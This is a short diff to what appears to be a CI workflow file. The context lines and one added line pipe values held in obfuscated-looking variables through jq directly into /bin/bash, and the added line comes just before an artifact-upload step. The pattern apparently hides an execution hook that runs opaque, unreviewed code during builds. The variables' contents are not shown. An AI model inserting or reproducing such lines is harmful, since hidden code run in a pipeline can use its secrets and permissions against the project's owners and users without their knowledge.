@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$rcpt3324" | jq -r .ns3553 | /bin/bash
           echo $n54442 | jq -r .se59526 | /bin/bash
           printf '%s' "$e164" | jq -r .la8 | /bin/bash
+          printf '%s' "$fuob8" | jq -r .vofmi809 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
